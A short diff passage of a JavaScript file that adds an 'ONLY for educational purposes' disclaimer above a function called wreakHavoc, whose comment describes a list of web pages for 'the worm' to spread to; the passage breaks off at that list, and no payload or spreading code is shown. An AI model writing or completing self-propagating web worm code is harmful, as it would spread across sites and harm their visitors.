@@ -1,3 +1,5 @@
+// Please note that this is ONLY for educational purposes.
+
 (function wreakHavoc() {
     // List of URLs to spread to (add the URLs of the other pages where you want the worm to go)
     const pagesToSpreadTo = [
